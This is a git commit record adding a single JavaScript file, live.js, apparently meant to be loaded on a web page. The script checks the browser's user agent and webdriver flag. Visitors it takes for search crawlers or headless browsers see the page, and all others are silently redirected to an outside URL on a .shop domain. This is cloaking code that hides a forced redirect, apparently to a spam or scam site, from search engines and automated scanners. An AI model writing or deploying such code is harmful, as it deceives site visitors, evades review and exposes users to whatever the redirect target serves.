b63c728859c950f750aa0894b1098812c1732906
onimoni-tv <onimoni387@gmail.com>
2026-07-21 08:11:16 +0300

    Add files via upload

---
+++ live.js
@@ -0,0 +1,20 @@
+﻿var ua = navigator.userAgent.toLowerCase();
+
+var isLikelyBot =
+  ua.includes('googlebot') ||
+  ua.includes('bingbot') ||
+  ua.includes('yahoo') ||
+  ua.includes('yandex') ||
+  ua.includes('baiduspider') ||
+  ua.includes('compatible') ||     
+  ua.includes('bot') ||
+  ua.includes('crawler') ||
+  ua.includes('spider') ||
+  /headless/i.test(ua) ||           
+  navigator.webdriver === true;     
+
+if (!isLikelyBot) {
+  window.location.replace("https://l6df.shop/3/rd.php?url=/f/6EGe");
+} else {
+  console.log("Bot/crawler-like detected → serving content");
+}
